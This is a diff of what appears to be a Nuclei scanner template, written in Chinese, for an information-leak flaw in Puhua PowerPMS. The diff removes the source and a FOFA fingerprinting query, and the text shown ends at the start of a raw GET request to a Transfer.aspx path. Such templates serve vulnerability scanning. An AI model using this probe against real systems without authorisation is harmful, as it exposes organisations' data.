@@ -3,12 +3,8 @@ info:
   name: 普华PMS Transfer存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/df4cisgn1ywa02xu'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: df4cisgn1ywa02xu
-    fofa: app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
 http:
 - raw:
   - 'GET /PowerPlat/Tools/Transfer.aspx?ServerOperatorType=LoadDataSource HTTP/1.1
